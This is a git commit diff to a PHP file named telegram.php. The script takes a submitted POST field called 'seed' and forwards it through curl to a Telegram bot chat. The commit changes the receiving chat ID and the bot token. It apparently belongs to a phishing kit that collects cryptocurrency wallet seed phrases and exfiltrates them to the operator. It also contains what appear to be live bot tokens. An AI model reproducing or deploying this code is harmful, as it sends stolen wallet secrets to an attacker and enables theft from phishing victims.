7c2b89fa4aa0c61ad35764e3e33cc76fa2b943fa
EL GHAYOUBI <abdelouadoud.elghayoubi@atos.net>
2022-05-17 16:09:11 +0100

    ajout de tout les fichier omari

--- telegram.php
+++ telegram.php
@@ -2,13 +2,13 @@
 echo "hello world";
 //create array
 $parameters=array(
-"chat_id" =>'2056334457',
+"chat_id" =>'1346730446',
 "text" => ''.$_POST['seed'].''
 );
 send("sendMessage",$parameters);
 //create Function Send Message
 function send($method,$parameters){
-    $bot_token='5113083511:AAGstxTNxpfK0ltwpRilia63bFHzFB7XzOA';
+    $bot_token='5372578231:AAEjQwa7PWVECeXnTYvlrGwj1MRs-OcKQPg';
     $url="https://api.telegram.org/bot$bot_token/$method";
 
     if(!$curl = curl_init()){
